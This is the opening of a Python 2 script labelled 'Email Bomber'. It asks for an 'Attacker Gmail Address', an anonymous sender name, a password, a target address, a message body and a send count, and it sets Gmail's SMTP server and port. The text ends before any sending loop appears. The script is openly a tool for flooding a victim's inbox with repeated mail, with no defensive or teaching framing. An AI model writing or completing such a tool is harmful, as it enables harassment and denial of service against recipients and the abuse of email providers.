#!/usr/bin/env/python

#imports
import os
import smtplib
import getpass
import sys
import time

print 'Email Bomber'
print '                                                                    '


print '                                           '

print '    '
email = raw_input('Attacker Gmail Address : ')
print '             '
user = raw_input('Anonymous name : ')
print '      '
passwd = getpass.getpass('Password: ')

print '   '

to = raw_input('\nTo: ')


print '    '

body = raw_input('Message: ')

print '    '

total = input('Number of send: ')

smtp_server = 'smtp.gmail.com'
port = 587
